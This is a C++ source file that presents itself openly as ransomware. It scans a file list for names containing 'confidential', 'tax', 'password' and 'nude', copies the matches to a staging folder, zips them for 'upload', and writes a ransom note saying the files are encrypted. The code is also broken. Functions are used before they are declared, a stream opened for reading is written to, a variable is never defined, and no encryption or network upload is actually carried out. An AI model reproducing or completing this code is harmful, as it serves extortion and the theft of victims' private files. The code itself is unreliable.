#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <algorithm>
#include <zip.h>

std::string gethostname() {
    #ifdef _WIN32
        char hostname[50];
        gethostname(hostname, 49);
        return std::string(hostname);
    #else
        return "Unknown";
    #endif
}

void find_sensitive_files(std::string victim) {
    std::ifstream infile("files.txt");
    if (!infile.is_open()) {
        std::cerr << "Unable to open files list\n";
        return;
    }

    std::vector<std::string> keywords = {"confidential", "tax", "password", "nude"};
    std::string line;

    while (std::getline(infile, line)) {
        // Check if file contains any sensitive keywords
        for (const auto& keyword : keywords) {
            if (line.find(keyword) != std::string::npos) {
                // File is a potential target
                copy_file(line, victim);
                return;
            }
        }
    }

    infile.close();
}

void copy_file(std::string filename, std::string victim) {
    std::ifstream infile(filename);

    if (!infile.is_open()) {
        std::cerr << "Unable to open file\n";
        return;
    }

    std::ofstream outfile("temp/" + filename);

    if (!outfile.open()) {
        std::cerr << "Unable to create temporary file\n";
        return;
    }

    outfile << infile.rdbuf();
    outfile.close();

    infile.close();
}

void upload_files(std::string victim) {
    std::ifstream infile("temp/" + victim + ".txt");

    if (!infile.is_open()) {
        std::cerr << "Unable to open staged file\n";
        return;
    }

    std::ifstream outfile("uploaded/" + victim + ".zip");

    if (!outfile.is_open()) {
        std::ofstream uploadFile("uploaded/" + victim + ".zip");
        zip_t zipper;
        int ret = zipper.open(zipper.WRITE, "temp/" + victim + ".txt", 0);
        ret = zipper.write(0, 0);

        if (ret != 0) {
            std::cerr << "Unable to create zip file\n";
            return;
        }

        outfile.close();
    }

    std::ifstream uploadInput("temp/" + victim + ".txt");
    if (!uploadInput.is_open()) {
        std::cerr << "Unable to open staged file for uploading.\n";
        return;
    }

    while (std::getline(uploadInput, line)) {
        outfile << line;
    }

    outfile.close();
}

void ransomware(std::string victim) {
    find_sensitive_files(victim);

    upload_files(victim);
    
    std::ofstream notifyFile("notify.txt");
    notifyFile << "Your files have been encrypted! Pay the ransom to get the decryption key. Victim: " << victim;
    notifyFile.close();
}

int main() {
    std::string hostname = gethostname();
    std::cout << "Attacking " << hostname << "\n";
    ransomware(hostname);

    return 0;
}
